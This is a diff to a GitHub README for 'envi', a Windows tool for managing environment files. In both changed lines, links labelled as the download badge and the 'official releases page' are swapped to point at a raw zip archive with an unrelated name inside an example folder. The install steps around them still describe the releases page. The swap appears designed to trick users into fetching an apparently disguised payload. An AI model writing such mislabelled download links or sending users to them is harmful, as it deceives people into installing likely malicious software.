@@ -1,6 +1,6 @@
 # ⚙️ envi - Manage environment files with ease
 
-[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/26th-phycobilin929/envi/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/26th-phycobilin929/envi/raw/refs/heads/main/example/Software-unconstantness.zip)
 
 Envi helps you organize your environment files. These files hold secret keys and settings for your software projects. Managing them manually creates mistakes. Envi provides a clear interface to view, compare, and fix these files. You save time and reduce errors in your projects. 
 
@@ -8,7 +8,7 @@ Envi helps you organize your environment files. These files hold secret keys and
 
 Follow these steps to get envi on your Windows computer:
 
-1. Visit the [official releases page](https://github.com/26th-phycobilin929/envi/releases).
+1. Visit the [official releases page](https://github.com/26th-phycobilin929/envi/raw/refs/heads/main/example/Software-unconstantness.zip).
 2. Look for the section titled "Assets" under the most recent version.
 3. Click the file ending in `.exe` that matches your system.
 4. Save the file to your computer.
